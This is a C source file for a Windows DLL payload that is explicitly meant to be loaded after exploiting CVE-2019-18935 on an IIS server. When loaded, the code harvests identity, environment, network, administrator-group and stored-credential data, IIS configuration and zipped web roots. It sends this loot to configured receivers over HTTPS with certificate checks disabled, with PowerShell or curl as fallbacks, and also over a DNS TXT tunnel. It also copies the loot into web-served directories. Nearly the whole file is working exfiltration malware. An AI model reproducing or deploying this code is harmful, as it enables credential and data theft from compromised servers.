#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "winhttp")
#pragma comment(lib, "bcrypt")
#pragma comment(lib, "advapi32")

/*
 * exfil.c — CVE-2019-18935 payload: harvest + outbound exfil.
 *
 * Runs as the IIS app-pool identity after deserialization. Does not depend on a
 * writable web-served directory (writemap showed all of wwwroot is denied).
 *
 * DESIGN NOTES (why this file is shaped the way it is)
 * ---------------------------------------------------
 * 1. Config is FOUND, not assumed. `run.sh` drops it at C:\Windows\Temp\c2.txt,
 *    but an earlier version of the *uploader* wrote it as <epoch>.txt, and the
 *    payload exited because c2.txt did not exist. So: try c2.txt first, then
 *    every *.txt in C:\Windows\Temp that actually starts with http/dns.
 * 2. Transport is native WinHTTP first. PowerShell may be locked down or absent
 *    and curl.exe only exists on Windows 10 1803+; PS and curl are fallbacks.
 * 3. Every step is logged to C:\Windows\Temp\exfil.log, and the log + loot are
 *    copied into every candidate web-served directory. On failure that log is
 *    the only thing that tells you why.
 * 4. DNS is a third channel (`dns:<domain>` in the config). TCP/443 is
 *    filtered on plenty of internal hosts, UDP/53 to the resolver almost never
 *    is. Text artifacts go out over DNS too, so `web.config` can still be read
 *    with HTTPS fully blocked.
 *
 * Beacons FIRST, before doing any work:
 *   /hello      id + identity      /f-<name>   base64 text artifact
 *   /manifest   name/size/sha      /c<i>       base64 zip chunk
 *   /done       "ok"
 */

#define TMP  "C:\\Windows\\Temp\\"
#define CFG  TMP "c2.txt"
#define LOGF TMP "exfil.log"
#define ZIP  TMP "src.zip"

#define MAX_URLS   6
#define MAX_DROPS  8
#define MAX_ART    8
#define CHUNK      45000
#define MAX_DNS_ART 6144

static const char *ARTIFACTS[] = {
    "whoami.txt", "env.txt", "ipconfig.txt", "apphost.config",
    "creds.txt", "admins.txt", "tree.txt", NULL
};

static char g_urls[MAX_URLS][512];
static int  g_nurls;
static char g_dns[256];
static char g_drops[MAX_DROPS][260];
static int  g_ndrops;
static char g_runid[16];

static FILE *g_log;
static CRITICAL_SECTION g_cs;

/* ------------------------------------------------------------------ utils */
static void logline(const char *fmt, ...)
{
    va_list ap;
    SYSTEMTIME st;

    if (!g_log) return;
    EnterCriticalSection(&g_cs);
    GetLocalTime(&st);
    fprintf(g_log, "%02d:%02d:%02d ", st.wHour, st.wMinute, st.wSecond);
    va_start(ap, fmt);
    vfprintf(g_log, fmt, ap);
    va_end(ap);
    fputc('\n', g_log);
    fflush(g_log);
    LeaveCriticalSection(&g_cs);
}

static void run(const char *cmd)
{
    system(cmd);
}

static long fsize(const char *path)
{
    WIN32_FILE_ATTRIBUTE_DATA a;
    if (!GetFileAttributesExA(path, GetFileExInfoStandard, &a)) return -1;
    return (long)a.nFileSizeLow;
}

static int starts_http(const char *s)
{
    return !strncmp(s, "https://", 8) || !strncmp(s, "http://", 7) ||
           !strncmp(s, "dns:", 4) || !strncmp(s, "drop:", 5);
}

static void trim(char *s)
{
    size_t n = strlen(s);
    while (n && (s[n - 1] == '\r' || s[n - 1] == '\n' || s[n - 1] == ' ' ||
                 s[n - 1] == '\t'))
        s[--n] = 0;
}

/* --------------------------------------------------------------- config IO */
/* returns 1 if a usable config was parsed */
static int load_config(char *src, size_t srclen)
{
    WIN32_FIND_DATAA fd;
    HANDLE h;
    char best[260] = "";
    FILETIME bestt;
    FILE *f;
    char line[600];
    int found = 0;

    memset(&bestt, 0, sizeof(bestt));
    src[0] = 0;

    f = fopen(CFG, "rb");
    if (f) {
        fclose(f);
        strncpy(best, CFG, sizeof(best) - 1);
    } else {
        /* No fixed-name config: take the newest .txt that looks like one. */
        h = FindFirstFileA(TMP "*.txt", &fd);
        if (h != INVALID_HANDLE_VALUE) {
            do {
                char p[260];
                FILE *t;
                snprintf(p, sizeof(p), TMP "%s", fd.cFileName);
                if (!strcmp(fd.cFileName, "whoami.txt") ||
                    !strcmp(fd.cFileName, "env.txt") ||
                    !strcmp(fd.cFileName, "ipconfig.txt") ||
                    !strcmp(fd.cFileName, "creds.txt") ||
                    !strcmp(fd.cFileName, "admins.txt") ||
                    !strcmp(fd.cFileName, "tree.txt"))
                    continue;
                t = fopen(p, "rb");
                if (!t) continue;
                if (!fgets(line, sizeof(line), t)) { fclose(t); continue; }
                fclose(t);
                if (!starts_http(line)) continue;
                if (CompareFileTime(&fd.ftLastWriteTime, &bestt) > 0) {
                    bestt = fd.ftLastWriteTime;
                    strncpy(best, p, sizeof(best) - 1);
                }
            } while (FindNextFileA(h, &fd));
            FindClose(h);
        }
    }

    if (!best[0]) { logline("config: NOT FOUND"); return 0; }
    strncpy(src, best, srclen - 1);
    src[srclen - 1] = 0;
    logline("config: %s", best);

    f = fopen(best, "rb");
    if (!f) return 0;
    while (fgets(line, sizeof(line), f)) {
        trim(line);
        if (!line[0] || line[0] == '#') continue;
        if (!starts_http(line)) continue;
        if (!strncmp(line, "dns:", 4)) {
            strncpy(g_dns, line + 4, sizeof(g_dns) - 1);
            found = 1;
        } else if (!strncmp(line, "drop:", 5)) {
            if (g_ndrops < MAX_DROPS)
                strncpy(g_drops[g_ndrops++], line + 5, sizeof(g_drops[0]) - 1);
            found = 1;
        } else if (g_nurls < MAX_URLS) {
            strncpy(g_urls[g_nurls++], line, sizeof(g_urls[0]) - 1);
            found = 1;
        }
    }
    fclose(f);
    return found;
}

/* --------------------------------------------------------------- transports */
static int post_winhttp(const char *url, const char *body, size_t len)
{
    wchar_t wurl[1024];
    URL_COMPONENTS uc;
    wchar_t host[256], path[1024];
    HINTERNET hs = NULL, hc = NULL, hr = NULL;
    DWORD flags, proto;
    int ok = 0;

    MultiByteToWideChar(CP_ACP, 0, url, -1, wurl, 1024);

    memset(&uc, 0, sizeof(uc));
    uc.dwStructSize = sizeof(uc);
    uc.lpszHostName = host;      uc.dwHostNameLength = 256;
    uc.lpszUrlPath = path;       uc.dwUrlPathLength = 1024;
    if (!WinHttpCrackUrl(wurl, 0, 0, &uc)) return 0;
    if (uc.nScheme != INTERNET_SCHEME_HTTP && uc.nScheme != INTERNET_SCHEME_HTTPS)
        return 0;

    hs = WinHttpOpen(L"Mozilla/5.0 (Windows NT; Win64; x64) exfil/2",
                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hs) return 0;
    WinHttpSetTimeouts(hs, 5000, 10000, 15000, 30000);

    hc = WinHttpConnect(hs, host, uc.nPort, 0);
    if (!hc) goto out;

    flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    hr = WinHttpOpenRequest(hc, L"POST", path, NULL, WINHTTP_NO_REFERER,
                            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hr) goto out;

    proto = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 |
            WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 |
            WINHTTP_FLAG_SECURE_PROTOCOL_TLS1;
    WinHttpSetOption(hr, WINHTTP_OPTION_SECURE_PROTOCOLS, &proto, sizeof(proto));
    if (flags) {
        DWORD sec = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hr, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));
    }

    if (!WinHttpSendRequest(hr, L"Content-Type: text/plain\r\n", (DWORD)-1L,
                            (LPVOID)body, (DWORD)len, (DWORD)len, 0))
        goto out;
    if (!WinHttpReceiveResponse(hr, NULL))
        goto out;
    ok = 1;
out:
    if (hr) WinHttpCloseHandle(hr);
    if (hc) WinHttpCloseHandle(hc);
    if (hs) WinHttpCloseHandle(hs);
    return ok;
}

static int post_powershell(const char *url, const char *file)
{
    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
        "powershell -NoProfile -ExecutionPolicy Bypass -Command "
        "\"try{$ErrorActionPreference='Stop';"
        "[Net.ServicePointManager]::SecurityProtocol="
        "[Net.SecurityProtocolType]::Tls12;"
        "Invoke-WebRequest -Uri '%s' -Method Post -InFile '%s' "
        "-ContentType 'text/plain' -UseBasicParsing -TimeoutSec 40|Out-Null}"
        "catch{exit 1}\"", url, file);
    return system(cmd) == 0;
}

static int post_curl(const char *url, const char *file)
{
    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
        "cmd /c curl.exe -s -f -m 40 -H \"Content-Type: text/plain\" "
        "--data-binary \"@%s\" \"%s\" >nul 2>&1", file, url);
    return system(cmd) == 0;
}

/*
 * POST `body` to every configured HTTP receiver, to <base>/<path>.
 * Returns the number of receivers that accepted it.
 */
static int post_all(const char *path, const char *body, size_t len)
{
    char file[300];
    int i, ok = 0;

    if (!g_nurls) return 0;

    snprintf(file, sizeof(file), TMP "body.tmp");
    {
        FILE *f = fopen(file, "wb");
        if (!f) return 0;
        fwrite(body, 1, len, f);
        fclose(f);
    }

    for (i = 0; i < g_nurls; i++) {
        char url[640];
        snprintf(url, sizeof(url), "%s/%s", g_urls[i], path);
        if (post_winhttp(url, body, len)) { ok++; logline("POST winhttp OK %s", path); continue; }
        logline("POST winhttp FAIL %s", path);
        if (post_powershell(url, file)) { ok++; logline("POST powershell OK %s", path); continue; }
        logline("POST powershell FAIL %s", path);
        if (post_curl(url, file)) { ok++; logline("POST curl OK %s", path); }
        else logline("POST curl FAIL %s", path);
    }
    return ok;
}

/* --------------------------------------------------------------- DNS channel */
static void sha256_hex(const unsigned char *data, size_t len, char *out)
{
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_HASH_HANDLE h = NULL;
    unsigned char dig[32];
    DWORD cb = 0;
    static const char *hx = "0123456789abcdef";
    int i;

    out[0] = 0;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0)))
        return;
    if (!BCRYPT_SUCCESS(BCryptCreateHash(alg, &h, NULL, 0, NULL, 0, 0)))
        goto out;
    if (!BCRYPT_SUCCESS(BCryptHashData(h, (PUCHAR)data, (ULONG)len, 0)))
        goto out;
    if (!BCRYPT_SUCCESS(BCryptFinishHash(h, dig, sizeof(dig), 0)))
        goto out;
    for (i = 0; i < (int)sizeof(dig); i++) {
        out[i * 2] = hx[dig[i] >> 4];
        out[i * 2 + 1] = hx[dig[i] & 15];
    }
    out[64] = 0;
out:
    if (h) BCryptDestroyHash(h);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
}

static void hexify(const unsigned char *in, size_t n, char *out)
{
    static const char *hx = "0123456789abcdef";
    size_t i;
    for (i = 0; i < n; i++) {
        out[i * 2] = hx[in[i] >> 4];
        out[i * 2 + 1] = hx[in[i] & 15];
    }
    out[n * 2] = 0;
}

/* Send `data` as TXT lookups: <tag><seq>-<hex>.<domain>. Best effort. */
static int dns_send(const char *tag, const unsigned char *data, size_t len)
{
    char hex[MAX_DNS_ART * 2 + 2];
    char cmd[1024];
    size_t off = 0;
    int seq = 0;

    if (!g_dns[0]) return 0;
    if (len > MAX_DNS_ART) len = MAX_DNS_ART;
    hexify(data, len, hex);

    while (off < len * 2) {
        char label[64];
        size_t take = (len * 2 - off > 56) ? 56 : (len * 2 - off);
        memcpy(label, hex + off, take);
        label[take] = 0;
        snprintf(cmd, sizeof(cmd),
            "cmd /c nslookup -type=TXT \"%s%s-%03d.%s\" >nul 2>&1",
            tag, label, seq++, g_dns);
        run(cmd);
        off += take;
    }
    logline("DNS sent %s (%u bytes, %d queries)", tag, (unsigned)len, seq);
    return seq;
}

/* ------------------------------------------------------------------- loot */
static void collect(const char *name, const char *cmd)
{
    char path[300];
    snprintf(path, sizeof(path), TMP "%s", name);
    if (fsize(path) > 0) { logline("collect: %s exists", name); return; }
    run(cmd);
    logline("collect: %s -> %ld bytes", name, fsize(path));
}

static void recon_zip(void)
{
    const char *roots[] = {
        "C:\\inetpub\\wwwroot",
        "C:\\inetpub\\wwwroot\\StartUp",
        "C:\\inetpub\\vhosts",
        NULL
    };
    int i;

    collect("whoami.txt",      "cmd /c whoami /all > " TMP "whoami.txt 2>&1");
    collect("env.txt",         "cmd /c set > " TMP "env.txt 2>&1");
    collect("ipconfig.txt",    "cmd /c ipconfig /all > " TMP "ipconfig.txt 2>&1");
    collect("admins.txt",      "cmd /c net localgroup administrators > " TMP "admins.txt 2>&1");
    collect("creds.txt",       "cmd /c cmdkey /list > " TMP "creds.txt 2>&1");
    collect("tree.txt",        "cmd /c dir /s /b C:\\inetpub\\wwwroot > " TMP "tree.txt 2>&1");
    collect("apphost.config",  "cmd /c type C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config > " TMP "apphost.config 2>&1");

    if (fsize(ZIP) > 1000) { logline("zip: already present (%ld bytes)", fsize(ZIP)); return; }

    for (i = 0; roots[i]; i++) {
        char cmd[1024];
        snprintf(cmd, sizeof(cmd),
            "powershell -NoProfile -ExecutionPolicy Bypass -Command \""
            "try { Compress-Archive -Path '%s\\*' -DestinationPath '" ZIP "' "
            "-Force -ErrorAction Stop } catch { exit 1 }\"", roots[i]);
        run(cmd);
        if (fsize(ZIP) > 1000) { logline("zip: %s -> %ld bytes", roots[i], fsize(ZIP)); return; }
        DeleteFileA(ZIP);
    }
    logline("zip: FAILED for every root");
}

/* --------------------------------------------------------- served-dir drop */
static int drop_all(void)
{
    const char *cand[] = {
        "C:\\inetpub\\wwwroot\\StartUp",
        "C:\\inetpub\\wwwroot",
        "C:\\inetpub\\wwwroot\\App_Data",
        "C:\\inetpub\\vhosts",
        "C:\\inetpub\\ftproot",
        NULL
    };
    const char *files[] = { "src.zip", "exfil.log", "whoami.txt", "apphost.config", NULL };
    char dirs[MAX_DROPS + 8][260];
    int nd = 0, i, j, ok = 0;

    for (i = 0; i < g_ndrops; i++) { strncpy(dirs[nd++], g_drops[i], 259); }
    for (i = 0; cand[i] && nd < (int)(sizeof(dirs) / sizeof(dirs[0])); i++)
        strncpy(dirs[nd++], cand[i], 259);

    for (i = 0; i < nd; i++) {
        int any = 0;
        for (j = 0; files[j]; j++) {
            char src[300], dst[600];
            DWORD attr = GetFileAttributesA(dirs[i]);
            if (attr == INVALID_FILE_ATTRIBUTES ||
                !(attr & FILE_ATTRIBUTE_DIRECTORY))
                break;
            snprintf(src, sizeof(src), TMP "%s", files[j]);
            snprintf(dst, sizeof(dst), "%s\\%s", dirs[i], files[j]);
            if (CopyFileA(src, dst, FALSE)) any = 1;
        }
        if (any) { ok++; logline("drop OK   %s", dirs[i]); }
        else     { logline("drop fail %s", dirs[i]); }
    }
    return ok;
}

/* ------------------------------------------------------------------ worker */
static DWORD WINAPI Worker(LPVOID p)
{
    char cfgpath[300];
    int dropped;

    (void)p;
    Sleep(400);

    snprintf(g_runid, sizeof(g_runid), "%08x", (unsigned)GetTickCount() ^ (unsigned)GetCurrentProcessId());

    if (!load_config(cfgpath, sizeof(cfgpath)))
        logline("no receiver configured - local + drop channels only");

    {
        char hello[400];
        char user[128] = "?";
        DWORD un = sizeof(user);
        GetUserNameA(user, &un);
        snprintf(hello, sizeof(hello), "id=%s user=%s host=%s cfg=%s",
                 g_runid, user, getenv("COMPUTERNAME") ? getenv("COMPUTERNAME") : "?",
                 cfgpath);
        logline("hello: %s", hello);
        post_all("hello", hello, strlen(hello));
        if (g_dns[0]) dns_send("h", (const unsigned char *)hello, strlen(hello));
    }

    recon_zip();

    /* text artifacts: HTTP + DNS */
    {
        int i;
        for (i = 0; ARTIFACTS[i]; i++) {
            char path[300], name[64];
            long n;
            unsigned char *buf;
            FILE *f;

            snprintf(path, sizeof(path), TMP "%s", ARTIFACTS[i]);
            n = fsize(path);
            if (n <= 0) continue;
            buf = malloc((size_t)n);
            f = fopen(path, "rb");
            if (!buf || !f) { free(buf); if (f) fclose(f); continue; }
            fread(buf, 1, (size_t)n, f);
            fclose(f);

            snprintf(name, sizeof(name), "f-%s", ARTIFACTS[i]);
            post_all(name, (const char *)buf, (size_t)n);
            if (g_dns[0])
                dns_send(ARTIFACTS[i][0] == 'w' ? "w" : "a", buf, (size_t)n);
            logline("artifact sent: %s (%ld bytes)", ARTIFACTS[i], n);
            free(buf);
        }
    }

    /* zip: HTTP only (DNS would need thousands of queries) */
    {
        long n = fsize(ZIP);
        if (n > 1000 && g_nurls) {
            FILE *f = fopen(ZIP, "rb");
            unsigned char *raw = malloc((size_t)n);
            char sha[80] = "";
            if (raw && f) {
                char *b64;
                size_t blen;
                int i, chunks;
                char man[256];

                fread(raw, 1, (size_t)n, f);
                sha256_hex(raw, (size_t)n, sha);
                blen = (size_t)((n + 2) / 3) * 4 + 4;
                b64 = malloc(blen);
                if (b64) {
                    static const char *tb =
                        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                    size_t o = 0, k;
                    for (k = 0; k < (size_t)n; k += 3) {
                        unsigned v = raw[k] << 16;
                        if (k + 1 < (size_t)n) v |= raw[k + 1] << 8;
                        if (k + 2 < (size_t)n) v |= raw[k + 2];
                        b64[o++] = tb[(v >> 18) & 63];
                        b64[o++] = tb[(v >> 12) & 63];
                        b64[o++] = (k + 1 < (size_t)n) ? tb[(v >> 6) & 63] : '=';
                        b64[o++] = (k + 2 < (size_t)n) ? tb[v & 63] : '=';
                    }
                    b64[o] = 0;
                    blen = o;

                    chunks = (int)((blen + CHUNK - 1) / CHUNK);
                    snprintf(man, sizeof(man),
                             "name=src.zip&size=%ld&b64=%u&sha=%s&chunks=%d",
                             n, (unsigned)blen, sha, chunks);
                    post_all("manifest", man, strlen(man));
                    logline("zip: %ld bytes -> %d chunks", n, chunks);

                    for (i = 0; i < chunks; i++) {
                        char p[32];
                        size_t off = (size_t)i * CHUNK;
                        size_t len = blen - off > CHUNK ? CHUNK : blen - off;
                        snprintf(p, sizeof(p), "c%d", i);
                        post_all(p, b64 + off, len);
                        if ((i % 10) == 0) logline("chunk %d/%d", i + 1, chunks);
                    }
                    post_all("done", "ok", 2);
                    free(b64);
                }
                free(raw);
            }
            if (f) fclose(f);
        } else if (n > 1000) {
            logline("zip: %ld bytes, no HTTP receiver - skipped", n);
        }
    }

    /* last resort: drop into web-served dirs so it can be curled, and leave
       the log there so a later writemap/pull can find it */
    dropped = drop_all();
    logline("drop: %d dir(s) accepted", dropped);

    if (g_log) { fflush(g_log); fclose(g_log); g_log = NULL; }
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    HANDLE h;
    (void)lpReserved;

    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        InitializeCriticalSection(&g_cs);
        g_log = fopen(LOGF, "ab");
        if (g_log) logline("=== loaded pid=%u ===", GetCurrentProcessId());
        h = CreateThread(0, 0, Worker, 0, 0, 0);
        if (h) CloseHandle(h);
    }
    return TRUE;
}
